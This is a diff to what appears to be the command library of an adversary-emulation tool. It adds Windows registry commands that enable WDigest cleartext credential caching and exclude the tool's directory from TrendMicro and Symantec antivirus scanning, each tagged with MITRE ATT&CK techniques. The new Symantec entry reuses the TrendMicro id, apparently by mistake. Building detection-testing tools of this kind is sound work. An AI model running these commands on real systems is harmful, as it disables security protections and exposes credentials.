@@ -4,7 +4,7 @@ commands:
    enable_wdigest:
       remote: false
       id: enable_wdigest
-      command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1'
+      command: 'cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1'
       stealth: low
       mitre:
          - 'Defense Evasion;T1112;Modify Registry'
@@ -22,7 +22,16 @@ commands:
    trendmicro_reg_exclusion:
       remote: false
       id: trendmicro_reg_exclusion
-      command: 'REG ADD "HKLM\SOFTWARE\TrendMicro\UniClient\1700\Scan\Exceptions\0" /v $CURDIR$ /t REG_DWORD /d 1 /f'
+      command: 'cmd.exe /c REG ADD "HKLM\SOFTWARE\TrendMicro\UniClient\1700\Scan\Exceptions\0" /v $CURDIR$ /t REG_DWORD /d 1 /f'
+      stealth: low
+      mitre:
+         - 'Defense Evasion;T1112;Modify Registry'
+         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
+      comments: 'Exclude threatsim from TrendMicro.'
+   symantec_reg_exclusion:
+      remote: false
+      id: trendmicro_reg_exclusion
+      command: 'cmd.exe /c REG ADD "HKLM\\SOFTWARE\Wow6432Node\Symantec\Symantec Endpoint Protection\AV\Exclusions\Domain Controller" && cmd.exe /c REG ADD "HKLM\\SOFTWARE\Wow6432Node\Symantec\Symantec Endpoint Protection\AV\Exclusions\Domain Controller\NoScanDir" /v $CURDIR$ /t REG_DWORD /d 1 /f'
       stealth: low
       mitre:
          - 'Defense Evasion;T1112;Modify Registry'
